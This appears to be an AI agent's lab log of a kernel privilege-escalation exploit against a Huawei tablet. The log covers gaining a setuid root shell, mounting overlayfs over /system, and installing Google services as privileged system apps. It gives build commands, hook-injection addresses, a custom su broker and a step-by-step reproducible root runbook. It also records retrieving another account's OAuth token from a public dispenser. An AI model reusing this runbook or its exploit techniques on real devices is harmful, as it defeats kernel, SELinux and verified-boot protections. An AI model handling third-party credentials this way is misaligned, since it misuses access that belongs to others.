        (low32 0xb6fd40 has bit21 set = CAP_SYS_ADMIN)
  [child, mount]
  root: mount(tmpfs,'/data/local/tmp/glrt',0,NULL) rc=-1 errno=13
  root: mount(tmpfs,'/mnt',0,NULL) rc=0 errno=0
  [child, 4755 shell]
  root: glsh '/mnt/glsh' chown=-1/1 chmod=0/0 stat=0 uid=0 gid=2000 mode=104755 size=303720
  root: grandchild exec status=0
    --- 4755 shell exec (from uid-0 child) ---
    uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
  [MAIN, the decisive setuid proof: a uid-2000 fork execs the 4755 shell]
  root: setuid proof path=/mnt/glsh glsh_ok=1
  root: setuid proof child status=0
    --- uid-2000 exec of 4755 glsh ---
    uid=0(root) gid=2000(shell) euid=0(root) groups=2000(shell),1004(input),1007(log),
      1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
      3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
    0
    u:r:shell:s0
  [/proc/self/mountinfo]  1896 42 0:44 / /mnt rw,relatime shared:47 - tmpfs tmpfs rw,seclabel,gid=2000
        (the pre-existing /mnt is 42 ... rw,nosuid,nodev,noexec; the NEW stack top is 1896, NOT nosuid/noexec)
  [/proc/mounts]  tmpfs /mnt tmpfs rw,seclabel,relatime,gid=2000 0 0
  [stat /mnt/glsh]  Access: (04755/-rwsr-xr-x)  Uid: (0/root)  Gid: (2000/shell)
  [ls -l /data/local/tmp]  -rw-r--r-- 1 root shell 67 rooted.txt
                           -rwsr-xr-x 1 root shell 303720 rsh
  [rooted.txt]  === GHOSTLOCK MRX-W09 rooted === / uid=0 euid=0 context=u:r:shell:s0
  [su -c id]    uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
  => a DIRECT mount(2) from the capped uid-0 child created a NON-nosuid tmpfs, a
     root-owned 4755 /system/bin/sh copy on it executes with euid 0 for a
     NON-root (uid 2000) caller, and the existing uid-0 proof files + rsh + su
     server still work.  COMPLETE ROOT.

NOTES / residual observations (not blockers)
  - /data/local/tmp/glrt returned EACCES (errno 13) - a cached mounton AVC from the
    pre-patch epoch; the child then fell through to /mnt exactly as the task
    instructed.  A future run could avc_miss_gen-sweep keyed to that mountpoint.
  - The "root: MOUNTS '...'" report line matched the OLD /mnt line (strstr), so it
    wrongly printed nosuid=1; /proc/self/mountinfo above is the authoritative record
    of the new mount (id 1896, no nosuid/noexec).
  - mksh (the /system/bin/sh copy) calls setgid(getgid()) at startup and the Android
    setresgid patch then sets fsgid=egid=0, so a setuid shell drops euid unless
    invoked with -p; that is why the setuid proofs use `sh -p -c`.  The child's own
    `id` therefore shows gid 0 while the uid-2000 exec of glsh shows gid 2000.
  - Only /data/local/tmp/glrt was attempted before /mnt; /dev and /data/local/tmp
    were not reached (success broke the loop).  The target list is in the code.


### (152) 2026-09-26 AGENT: GLOBAL MOUNT CONFIRMED - setns(/proc/1/ns/mnt) is UNNECESSARY because the
shell already IS in init's mount namespace; plus OVERLAYFS FEASIBLE with a real /system lowerdir

Task: in --root, enter init's mount namespace and mount there so ANY process (a separate adb
shell, system_server) sees it; verify from an independent adb shell; then answer overlayfs
feasibility (CONFIG_OVERLAY_FS) for the GMS systemize plan.

*** CORRECTION OF THE (151) CAVEAT (important) ***
The claim "the mount is only visible inside the exploiter's namespace; a separate adb shell
/mnt/glsh -c id prints uid=2000" was a MISDIAGNOSIS, for two reasons:
  (a) uid=2000 is just mksh DROPPING euid: /system/bin/sh must be run with -p.  Measured on a
      fresh adb shell: `/data/local/tmp/glrt/glsh -c id` -> uid=2000, but
      `/data/local/tmp/glrt/glsh -p -c id` -> uid=0(root) euid=0(root).
  (b) the namespace is SHARED with init.  From the root child:
      `root: NS before_self=mnt:[4026533392] init=mnt:[4026533392] open=73 ... after_self=mnt:[4026533392]`
      (readlink of BOTH /proc/<child>/ns/mnt and /proc/1/ns/mnt returned the SAME nsfs inode
      4026533392) and a plain adb shell's /proc/self/mountinfo carries the SAME mount ids
      (1896/1930/2318) as /proc/1/mountinfo.  A cloned namespace (system_server, pid 1677) has
      DIFFERENT ids (1928/1935/2323) and sees the mounts via slave propagation (master:47/48/49).
  So the mount was ALREADY GLOBAL in (151); nothing about the namespace was limited.

Build: F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
  -O2 -static -pthread -o F:\testtest\testenv\binder_uaf\session_20260922\ghostlock_mrx\ghostlock_e
     F:\testtest\testenv\binder_uaf\session_20260922\ghostlock_mrx\ghostlock_mrx_e.c
  source sha256 A502EE23040562889684AF984AEC7B5AB7D948CDFA6CE547F209BB37BCDFE3AD
  binary sha256 00A3E280A212DB3C74F3D1C4B8F7233CFD5A6ED0FB9A35BC8E61018C5E8F413D
  pushed to /data/local/tmp/ghostlock_e (device sha256 matches); the enabler runbook ran after a
  clean reboot (device rebooted first - the previous MAIN was parked): place 0x84000 0x244 0x7a3d8;
  hook 0x7a3d4 0x84000; nohup /system/bin/bugreportz & sleep 25; restore 0x7a3d4 0xd10403ff ->
  perf_event_paranoid=-1; then `nohup /data/local/tmp/ghostlock_e --root > /data/local/tmp/gl.out 2>&1 &`.
  Device alive, no panic.  `--simple`/`--cede`/`--full`/`--freeze` are UNCHANGED: the two new
  helpers are only called from root_mount_and_shell() (--root only).

WHAT WAS ADDED (only ghostlock_mrx_e.c)
  1. enter_init_mntns(): readlink /proc/<pid>/ns/mnt and /proc/1/ns/mnt, open /proc/1/ns/mnt,
     setns(fd, CLONE_NEWNS), re-readlink; logs every rc/errno.  Called FIRST in
     root_mount_and_shell().
  2. overlay_test(): (a) overlay over a NEW dir under the new tmpfs (lower pre-populated with
     marker.txt, plus upper/work/merged), (b) lower=/system/etc/permissions (a REAL read-only
     system dir, erofs/dm-verity) with the tmpfs upper, (c) a retry with a /data upper.  Every
     mount(2) logs the raw data string + rc/errno.
  3. Writes /data/local/tmp/global_mounts.txt + global_mountinfo.txt (the child's view) and logs
     every matching /proc/mounts line.

DEVICE EVIDENCE (build 00a3e280, run 1; raw files: run152_gl.klog, run152_realroot.txt,
run152_global_mounts.txt, run152_global_mountinfo.txt, run152_setuid_output.txt,
global_mount_evidence_152.txt)
  [child, root_mount_and_shell - raw]
    root: NS before_self=mnt:[4026533392] init=mnt:[4026533392] open=73 open_errno=0
          setns_rc=-1 setns_errno=1 after_self=mnt:[4026533392]
    root: mount(tmpfs,'/data/local/tmp/glrt',0,NULL) rc=0 errno=0
    root: glsh '/data/local/tmp/glrt/glsh' chown=-1/1 chmod=0/0 stat=0 uid=0 gid=2000 mode=104755 size=303720
  => the child is ALREADY in init's namespace (same inode) and setns returned -1/EPERM(1).
  WHY setns EPERM: Huawei's fs/namespace.c mntns_install() (line 3548) requires THREE caps:
      if (!ns_capable(mnt_ns->user_ns, CAP_SYS_ADMIN) ||
          !ns_capable(current_user_ns(), CAP_SYS_CHROOT) ||
          !ns_capable(current_user_ns(), CAP_SYS_ADMIN))
              return -EPERM;
  The --root cap value (node low32 = 0xb47a7d40) has bit21 (CAP_SYS_ADMIN=0x200000) but NOT
  bit18 (CAP_SYS_CHROOT=0x40000), so the 2nd ns_capable fails -> EPERM.  mount(2) needs only
  CAP_SYS_ADMIN, which is why it succeeds.  (root_cap_value() selects only bit21; to make setns
  return 0 it would have to require bit18 too, ~1/4 per parked window.)  Since self==init,
  setns is unnecessary and the mount below is GLOBAL without it.

  [child, overlay rc/errno + raw data]
    OVL[newdir-tmpfs] merged=/data/local/tmp/glrt/glovl/merged rc=0 errno=0
      data='lowerdir=/data/local/tmp/glrt/glovl/lower,upperdir=/data/local/tmp/glrt/glovl/upper,workdir=/data/local/tmp/glrt/glovl/work'
    OVL[syslower-tmpfs] merged=/data/local/tmp/glrt/glovl/sysview rc=0 errno=0
      data='lowerdir=/system/etc/permissions,upperdir=/data/local/tmp/glrt/glovl/upper,workdir=/data/local/tmp/glrt/glovl/work'
    OVL[syslower-data] rc=-1 errno=22 (EINVAL; the /data-upper retry - not needed, the tmpfs
      upper already works; kept for the record)

  [INDEPENDENT separate adb shell - the decisive verification]
    A. grep -E 'glrt|glovl' /proc/mounts  (fresh adb shell, uid 2000):
       tmpfs /data/local/tmp/glrt tmpfs rw,seclabel,relatime,gid=2000 0 0
       overlay /data/local/tmp/glrt/glovl/merged overlay rw,seclabel,relatime,lowerdir=...
       overlay /data/local/tmp/glrt/glovl/sysview overlay rw,seclabel,relatime,lowerdir=/system/etc/permissions,...
    B. adb-shell /proc/self/mountinfo  ==  init(1) /proc/1/mountinfo  (SAME mount ids):
       1896 99 0:44 / /data/local/tmp/glrt rw,relatime shared:47 - tmpfs tmpfs rw,seclabel,gid=2000
       1930 1896 0:45 / /data/local/tmp/glrt/glovl/merged ... shared:48 - overlay ...
       2318 1896 0:46 / /data/local/tmp/glrt/glovl/sysview ... shared:49 - overlay ...
    C. system_server (pid 1677; CLONED slave namespace) sees the propagated mounts:
       1928 314 0:44 / /data/local/tmp/glrt ... master:47 - tmpfs ...
       1935 1928 0:45 / .../glovl/merged ... master:48 - overlay ...
       2323 1928 0:46 / .../glovl/sysview ... master:49 - overlay ...
       => ANY process (adb shell, init, system_server) sees the mount: GLOBAL.
    D. /data/local/tmp/glrt/glsh -p -c id -> uid=0(root) gid=2000(shell) euid=0(root) groups=... context=u:r:shell:s0
       (a uid-2000 adb shell gets euid 0 through the 4755 shell).
    E. /data/local/tmp/glrt/glsh -c id -> uid=2000 (mksh drops euid without -p) - the exact
       artifact that produced the (151) caveat.
    F. overlay merged view from the adb shell: marker.txt='LOWER-MARKER from tmpfs lowerdir',
       upper_proof.txt='UPPER-WRITE via overlay merged dir'.
    G. system-lowerdir overlay: `ls sysview | wc -l` = 71 XML files from
       /system/etc/permissions -> a REAL system lowerdir works.

  OBSERVATION / NOT A BLOCKER: inside the child, the just-mounted glrt line did not show in its
  own /proc/self/mounts read (logged "MOUNTS '(line not found)'", global_mounts.txt = 48 lines
  vs 69 live).  Cause: read_file() is a SINGLE page-sized read() (4038/4016 bytes) and the new
  mounts are appended at the very END of /proc/mounts (lines 67/68/69 of 69), i.e. past the
  truncation point.  The live adb-shell + init mountinfo (A-C above) are the authoritative record.

OVERLAYFS FEASIBILITY ANSWER (decides the GMS systemize plan)
  * CONFIG_OVERLAY_FS is BUILT IN: /proc/filesystems lists "overlay" (nodev) and /sys/module/overlay
    exists.
  * `mount -t overlay` WORKS on this kernel under this SELinux context: rc=0 with a tmpfs upper
    AND with lowerdir=/system/etc/permissions (erofs/dm-verity lower).  The overlay mounts are
    themselves GLOBAL (init + system_server see them, B/C above).  This is exactly the primitive
    the GMS plan needs (overlay over /system/priv-app); the remaining work is the PackageManager
    rescan at system_server start, NOT mount(2).
  * Plan note: the target must be at a mount point whose parent is in a SHARED peer group (the
    tmpfs we create over it, e.g. /mnt or /data/local/tmp/glrt, showed shared:47 and propagated to
    system_server's slave ns).  If overlaying /system directly, mount the tmpfs/overlay at the
    shared /system subtree or `mount --make-rshared` the parent first.

NEXT HYPOTHESES
  1. GMS: overlay /system/priv-app (or /system/product/priv-app) with lowerdir=the system dir +
     google dirs, then restart system_server so PackageManager rescans /system.
  2. If a real setns is ever needed (private shell ns), select a cap node with bit21 AND bit18
     (CAP_SYS_ADMIN|CAP_SYS_CHROOT) - or extend root_cap_value() to require both.


### (153) 2026-09-26 AGENT: NATIVE GMS SYSTEMIZED VIA OVERLAYFS - REAL Google Play Store / GMS / GSF ARE PRIVILEGED SYSTEM APPS AND THE PLAY STORE OPENS (N1+N2 of ghostlock_pocs/GMS_PLAN_20260926.md)

Task: N1 (obtain Google's official APKs: com.google.android.gms, com.google.android.gsf,
com.android.vending) + N2 (make them privileged system apps via an overlayfs over
/system/priv-app and /system/etc/permissions, then restart system_server so PackageManager
rescans /system), then verify from a plain adb shell and launch the Play Store.
Result: N1 + N2 COMPLETE; the real Google Play Store OPENS and renders live store content
(screencaps). Google-account sign-in was NOT tested (next milestone, needs an account).

DEVICE: Huawei MRX-W09 (Kirin 990, Android 10 / EMUI 11.0.0.235). The framework restart was
a SOFT reboot (kernel uptime kept counting); the overlays survived because they live in the
kernel mount table, not in system_server.

================================================================================
N1 - REAL (Google-signed) APKs
================================================================================
The %TEMP%\gms\*-hw.apk pair that the task hinted at is NOT Google:
  apksigner Signer #1 DN = O=NOGAPPS Project, C=DE  (labels "microG Services" / "microG Companion")
so both were rejected. Real APKs were taken from the publicly redistributed google-signed
MindTheGapps 10.0.0-arm64 bundle (MindTheGapps-10.0.0-arm64-20230922_081111.zip), which
packages Google's factory-image APKs. apksigner verified every signer:
  PrebuiltGmsCore.apk          com.google.android.gms  19.2.75 (120400-269183835)   targetSdk 29
  GoogleServicesFramework.apk  com.google.android.gsf  10  (versionCode 29)          targetSdk 29
  Phonesky.apk                 com.android.vending     15.2.67-all [0] [PR] 256058878 targetSdk 28
  all three: Signer #1 DN = CN=Android, OU=Android, O=Google Inc., L=Mountain View,
             ST=California, C=US
             Signer #1 SHA-256 = f0fd6c5b410f25cb25c3b53346c8972fae30f8ee7411df910480ad6b2d60db83
Aurora's dispenser (https://auroraoss.com/api/auth/ , note the trailing slash: without it
Cloudflare returns 403) IS reachable and a GET returned an account
{email:"auroranovalights@gmail.com", auth:"ya29...."} (an OAuth token); gpapi is installed on
the host but has no anonymous download path and the dispenser account has no password, so the
direct host-side Play download was not pursued. It was unnecessary because the GApps APKs are
already real and Google-signed. (microG remains the previously-confirmed fallback; this run is
the REAL Google stack.)
MindTheGapps also supplies the matching whitelists (installed into the permissions overlay):
  privapp-permissions-google.xml, privapp-permissions-google-p.xml,
  privapp-permissions-google-ps.xml  (the -ps file covers com.google.android.gms,
  com.google.android.gsf and com.android.vending), com.google.android.maps.xml,
  com.google.android.dialer.support.xml, and sysconfig/google.xml, google_build.xml,
  google-hiddenapi-package-whitelist.xml.
NOTE: ro.control_privapp_permissions=enforce on this build, so a missing whitelist entry would
have killed system_server while scanning; the GApps XMLs are written for exactly these packages
and loaded cleanly (system_server came up normally).

================================================================================
N2 - overlayfs systemize + framework rescan
================================================================================
Enabler runbook (as in FACTS 152), then the new binary:
  inject_hook place 0x84000 0x244 0x7a3d8 ; inject_hook hook 0x7a3d4 0x84000 ;
  nohup /system/bin/bugreportz & sleep 25 ; inject_hook restore 0x7a3d4 0xd10403ff
  -> perf_event_paranoid=-1   (all four lines observed)
  nohup /data/local/tmp/ghostlock_e --root > /data/local/tmp/gl.out 2>&1 &
--root completed: freeze/park permissive shell (access[post-shell] flags=1), cap value
  ffffffd8b03b3d40 (low32 carries bit21 = CAP_SYS_ADMIN), pid-0 shielded uid-0 child,
  4755 glsh created, child entered su_server.
Driver: a NEW in-process broker added to su_server (see CODE CHANGE) is used for the mounts,
because su_server is the only place that HOLDS the injected CAP_SYS_ADMIN: glsh (the setuid
shell) has CapEff=0000000000000000 / CapBnd=00000000000000c0 - an exec recomputes caps against
the bounding set and loses CAP_SYS_ADMIN, so it cannot mount.

Staging (root, /data/local/tmp/gms_setup.sh): copy the three APKs and the XMLs into the
--root tmpfs upper dirs /data/local/tmp/glrt/gms/{upper-priv,upper-perm,upper-sys}, chown 0:0,
chmod a+rX, then relabel EVERYTHING `chcon -R u:object_r:system_file:s0` (the shell type is
permissive, so the relabel is allowed). Overlay upper/work MUST be on tmpfs: a /data
(f2fs+fscrypt) upper returns EINVAL; tmpfs works and FACTS 152 proved the mounts are GLOBAL
(init ns + system_server slave ns). Verified labels:
  drwxrwxrwx root root u:object_r:system_file:s0  .../glrt/gms/upper-priv
  -rw-rw-rw- root root u:object_r:system_file:s0  .../upper-priv/PrebuiltGmsCore/PrebuiltGmsCore.apk
Mounts (via the broker; each returned rc=0 errno=0):
  overlay /system/priv-app        lowerdir=/system/priv-app        upperdir=.../upper-priv workdir=.../work-priv
  overlay /system/etc/permissions lowerdir=/system/etc/permissions upperdir=.../upper-perm workdir=.../work-perm
  overlay /system/etc/sysconfig   lowerdir=/system/etc/sysconfig   upperdir=.../upper-sys  workdir=.../work-sys
Merged entry counts: /system/priv-app 83 -> 86; /system/etc/permissions 70 -> 75;
/system/etc/sysconfig 2 -> 5. (/system/etc/permissions had no pre-existing google/privapp file,
so nothing was shadowed.)

FRAMEWORK RESTART: `kill -9 $(pidof system_server)` FAILED with EPERM, because the injected
CapEff (0xb03b3d40) has CAP_SYS_ADMIN but NOT CAP_KILL(5) and the uid/uid check fails
(system_server euid=1000). Instead `setprop ctl.restart zygote` (handled by init; the property
write is allowed by permissive shell) restarted zygote+system_server = SOFT reboot:
system_server 1674 -> 6312, zygote64 640 -> 6228, kernel uptime kept counting (no reboot), and
the overlays survived.

================================================================================
VERIFICATION (plain adb shell, uid 2000)
================================================================================
- /proc/mounts shows the three overlays after the restart.
- the new system_server's own mountinfo carries them (master:50/51 -> slave propagation), so
  PackageManager scanned the merged /system (before the restart PM knew nothing about GMS).
- pm list packages: com.android.vending, com.google.android.gms, com.google.android.gsf
- pm path:
    package:/system/priv-app/PrebuiltGmsCore/PrebuiltGmsCore.apk
    package:/system/priv-app/GoogleServicesFramework/GoogleServicesFramework.apk
    package:/system/priv-app/Phonesky/Phonesky.apk
    => SYSTEM apps (not /data/app).
- dumpsys package:
    com.google.android.gms   codePath=/system/priv-app/PrebuiltGmsCore          flags=[ SYSTEM ... ] privateFlags=[ ... PRIVILEGED ]
    com.google.android.gsf   codePath=/system/priv-app/GoogleServicesFramework  flags=[ SYSTEM ... ] privateFlags=[ ... PRIVILEGED ] userId=10141 (shared uid)
    com.android.vending      codePath=/system/priv-app/Phonesky                 flags=[ SYSTEM ... ] privateFlags=[ ... PRIVILEGED ] userId=10142
    all install permissions granted (vending: INSTALL_PACKAGES, DELETE_PACKAGES, WRITE_SECURE_SETTINGS,
    BACKUP, MANAGE_USERS, PACKAGE_VERIFICATION_AGENT, CHANGE_COMPONENT_ENABLED_STATE, ...).
- GMS is LIVE: ps shows com.google.android.gms, com.google.android.gms.persistent,
  com.google.android.gms.ui, com.google.android.gms.unstable (DroidGuard); logcat shows it in
  u:r:priv_app:s0 doing its chimera module scan from
  file:///system/priv-app/PrebuiltGmsCore/PrebuiltGmsCore.apk.

================================================================================
PLAY STORE LAUNCH (the N2 milestone)
================================================================================
First attempts returned `Error type 3 ... does not exist` (-92 START_CLASS_NOT_FOUND) for both
com.android.vending/com.android.vending.AssetBrowserActivity and
com.google.android.finsky.activities.MainActivity, and monkey said "No activities found" -
even when started as uid 0. ROOT CAUSE: `dumpsys user` showed User 0 State: RUNNING_LOCKED
(the tablet was at its post-restart 6-digit-PIN lockscreen, screen 1600x2560). While the user is
LOCKED, PackageManager/ActivityManager filter non-direct-boot-aware components, so a non-DBA app
like Play Store is unreachable (that is why com.android.settings, directBootAware=true, still
resolved). The package itself is correct: its manifest has AssetBrowserActivity
enabled=true exported=true with MAIN/LAUNCHER.
After the user became RUNNING_UNLOCKED (Unlock time +1m6s374ms), the launch succeeded:
  am start -W -n com.android.vending/com.android.vending.AssetBrowserActivity
    Starting: Intent { cmp=com.android.vending/.AssetBrowserActivity }
    Status: ok
    Activity: com.android.vending/com.google.android.finsky.activities.MainActivity
    Complete
  ps: com.android.vending (u0_a142) + com.android.vending:instant_app_installer + :recovery_mode
  dumpsys activity: TaskRecord A=10142:com.android.vending, ActivityRecord
    com.android.vending/.AssetBrowserActivity -> MainActivity.
SCREENCAPS (real Google Play, no mock/stub):
  playstore_launch.png - the Store search screen ("Google Play" search field, recent "youtube")
  playstore_home.png   - the Store home screen: header "Google Play", tabs Games/Apps/Books and
                         Recommended/Top charts/New/Premium/Categories/Family, "Recommended for you"
                         with real app cards (Hitman Sniper JPY520->170, Tricky Castle,
                         Mini Metro JPY130) and star ratings.
=> The real Google Play Store OPENS and renders live store content on this Huawei device.
NOT DONE / NEXT: Google-account sign-in (needs an account) then N3 certification (fingerprint
spoof + GSF re-registration) and the N4 measurement matrix. Honest status: N1+N2 COMPLETE,
Play Store opening VERIFIED, sign-in = next milestone.

================================================================================
CODE CHANGE (only ghostlock_mrx_e.c; --simple/--cede/--full/--freeze/--root stamp paths untouched)
================================================================================
Added a tiny IN-PROCESS broker to su_server (it only intercepts commands whose first two bytes
are "GL"; everything else still execs /system/bin/sh):
  GLMOUNT|src|tgt|fstype|flags_hex|data   ('-' => NULL pointer)  -> mount(2), replies rc/errno
  GLUMOUNT|tgt|flags_hex                                          -> umount2(2)
  GLCAP                                                           -> uid + CapEff/Prm/Bnd
The su_server grandchild is forked from the pid-0 child, so it inherits the injected
CAP_SYS_ADMIN; running mount(2) in-process is required because an exec cannot keep it.
Build: <NDK r20b> aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e_gms ghostlock_mrx_e.c
  source sha256 A6A90E9539282B2B23418DF8F920940E7CFE73246EF61254258C1F8E18FFC45D
  binary sha256 B44713E6FBCD7505D2E12CC41289E8FACB2D4B391C7545AA1D90A7C4610378EA
  (device /data/local/tmp/ghostlock_e sha256 verified identical)
Helper scripts (session_20260922): gms_setup.sh (staging + chcon), gms_restart.sh.
Evidence files under %TEMP%\gms\evidence\: gl.out, gl.klog, gl.stage, mounts_final.txt,
pm_list_final.txt, pm_path_final.txt, ps_google_final.txt, dumpsys_final_com.google.android.gms.txt,
dumpsys_final_com.android.vending.txt, playstore_launch.png, playstore_home.png, lock_screen2.png,
mounts_gms_before.txt, privapp_before.txt, permissions_before.txt.

REPRODUCIBLE RUNBOOK (one boot; unlock the tablet first so the Store can resolve):
  reboot ; unlock (dumpsys user must show RUNNING_UNLOCKED before launching the Store)
  push shellcode.bin (798B, placeholder word 0x14000000 @0x244) | inject_hook | ghostlock_e (B44713E6)
  inject_hook place 0x84000 0x244 0x7a3d8 ; inject_hook hook 0x7a3d4 0x84000 ;
  nohup /system/bin/bugreportz & sleep 25 ; inject_hook restore 0x7a3d4 0xd10403ff
  nohup /data/local/tmp/ghostlock_e --root > /data/local/tmp/gl.out 2>&1 &
  /data/local/tmp/su -c "sh /data/local/tmp/gms_setup.sh"                 # stage APKs+XMLs, chcon system_file
  /data/local/tmp/su -c "GLCAP"                                            # expect CapEff bit21
  /data/local/tmp/su -c "GLMOUNT|overlay|/system/priv-app|overlay|0|lowerdir=/system/priv-app,upperdir=/data/local/tmp/glrt/gms/upper-priv,workdir=/data/local/tmp/glrt/gms/work-priv"
  /data/local/tmp/su -c "GLMOUNT|overlay|/system/etc/permissions|overlay|0|lowerdir=/system/etc/permissions,upperdir=/data/local/tmp/glrt/gms/upper-perm,workdir=/data/local/tmp/glrt/gms/work-perm"
  /data/local/tmp/su -c "GLMOUNT|overlay|/system/etc/sysconfig|overlay|0|lowerdir=/system/etc/sysconfig,upperdir=/data/local/tmp/glrt/gms/upper-sys,workdir=/data/local/tmp/glrt/gms/work-sys"
  /data/local/tmp/su -c "setprop ctl.restart zygote"                      # SOFT framework restart, ~30s
  pm path / dumpsys package  -> /system/priv-app + SYSTEM + PRIVILEGED
  am start -n com.android.vending/com.android.vending.AssetBrowserActivity # opens the Store


### (153b) 2026-09-26 AGENT: ADDENDUM - the systemized Play Store really INSTALLED/UPDATED apps from Google's servers (and the known watchdog reboot)

Recorded from dumpsys while the (153) session was live (before the device rebooted):
  com.android.vending   15.2.67-all -> 53.2.23-29 [0] [PR] 980945147   lastUpdateTime 04:52:37
  com.google.android.gms 19.2.75    -> 26.34.36 (100400-981326859)      lastUpdateTime 04:53:00
        privateFlags still [... PRIVILEGED] - a /data/app update of a priv-app keeps the flag
  com.google.android.youtube 21.38.130                                  firstInstallTime 04:54:05
        YouTube was NOT preinstalled on this China/Huawei image; its installerPackageName is
        com.android.vending, i.e. the Play Store downloaded and installed it from Google's servers.
All three have installerPackageName=com.android.vending.
=> the Play Store's search/install/update path is LIVE, not merely a rendered UI. This is a
stronger result than the (153) "opens" milestone.

The device then rebooted on its own (userspace watchdog; loadavg ~35 with 1-2 runnable tasks -
the known post-exploit wedge documented since FACTS 9t). That is the known 1-boot-only limit:
the kernel reboot dropped the /system overlays (grep -c ' /system/priv-app ' /proc/mounts = 0),
perf_event_paranoid went back to 3 (injection gone) and root is gone. The /data/app updates
persist but are no longer backed by a /system/priv-app base, so they are NOT privileged system
apps any more. To restore native GMS, re-run the (153) runbook on a fresh boot.
